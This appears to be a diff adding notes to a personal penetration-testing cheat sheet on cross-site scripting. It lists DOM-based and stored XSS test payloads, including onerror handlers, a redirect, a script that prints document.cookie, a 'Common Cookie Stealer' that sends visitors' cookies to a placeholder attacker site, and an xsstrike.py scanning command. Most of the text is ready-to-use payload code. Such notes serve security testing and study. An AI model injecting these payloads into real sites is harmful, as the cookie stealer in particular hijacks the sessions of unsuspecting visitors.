@@ -1,6 +1,37 @@
 # Cross-Site Scripting (XSS)
 
 ## Discovery
+### DOM-Based
+> Done completely in the client browser. No request to server on data entry. Easily confused for relfected XSS. Needs a trigger to run the payload, such as 'img src=""'
+* Test Payloads 
+```javascript
+# Loads the print dialog
+<img src=x onerror=print(1)>
+
+# Pops the alert dialog (Do not use.(Most sites are designed to look for this))
+<img src=x onerror=alert(1)>
+
+# Send the user to another site 
+<img src=x onerror="window.location.href='https://google.com'">
+```
+### Stored XSS
+> Can be verified if its persistent across sessions. For example, if you upload '<h1>test</h1>' and open the same page in an incognito window or another browser and it remains. Useful for stealing session cookies.
+* Test Payloads
+Test with HTML first
+```html
+# Should appear as a heading on the page
+<h1>test</h1>
+```
+```javascript
+# Should pop the print dialog for every user that visits the page.
+<script>print(1)</script>
+
+# Tries to pring the session cookie
+<script>print(document.cookie)</script>
+
+# Common Cookie Stealer
+<script> var i = new Image; i.src="<Your website>/?"+document.cookie;</script>
+```
 ### xsstrike.py
 ```bash
 python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
